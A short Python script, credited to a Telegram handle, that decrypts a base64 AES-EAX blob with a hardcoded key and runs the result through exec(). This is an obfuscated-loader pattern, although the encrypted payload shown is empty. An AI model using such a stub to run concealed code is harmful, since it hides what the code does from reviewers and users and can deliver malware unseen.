# Telegram: @rafi_broh


import base64
from Crypto.Cipher import AES


def decrypt_data(data, key):
    nonce, tag, ciphertext = data[:16], data[16:32], data[32:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt_and_verify(ciphertext, tag)


encrypted_data = base64.b64decode("")


aes_key = b'\x1f~vy\xef\xe2\x13\xdfs\x0b\xae\xf0\xae\xf9\x9c\x00'


exec(decrypt_data(encrypted_data, aes_key))
